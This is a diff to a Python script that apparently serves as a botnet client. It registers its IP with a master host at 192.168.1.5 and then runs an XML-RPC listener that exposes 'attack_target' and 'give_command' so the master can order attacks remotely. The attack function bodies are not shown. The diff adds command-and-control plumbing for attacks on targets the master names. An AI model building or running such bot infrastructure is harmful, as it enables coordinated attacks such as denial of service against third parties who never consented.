@@ -3,6 +3,24 @@ import sys
 import socket
 import platform
 import xmlrpc.client
+from xmlrpc.server import SimpleXMLRPCServer, SimpleXMLRPCRequestHandler
+
+
+def getIpAddress():
+    return socket.gethostbyname(socket.gethostname())
+
+
+class RequestHandler(SimpleXMLRPCRequestHandler):
+    rpc_paths = ("/RPC2",)
+
+
+def listenMaster(ip_master):
+    server = SimpleXMLRPCServer(
+        (getIpAddress(), 5000), requestHandler=RequestHandler, allow_none=True)
+    server.register_introspection_functions()
+    server.register_function(attackTarget, "attack_target")
+    server.register_function(receiveCommand, "give_command")
+    server.serve_forever()
 
 
 def receiveCommand(message):
@@ -32,6 +50,10 @@ def attackTarget(message):
 if __name__ == '__main__':
     s = xmlrpc.client.ServerProxy("http://192.168.1.5:8000")
     print(s.system.listMethods())
-    ip_address = socket.gethostbyname(socket.gethostname())
+    ip_address = getIpAddress()
     s.register_ip(ip_address)
-    
+    try:
+        listenMaster("192.168.1.5")
+    except KeyboardInterrupt:
+        s.unregister_ip(ip_address)
+        sys.exit(0)
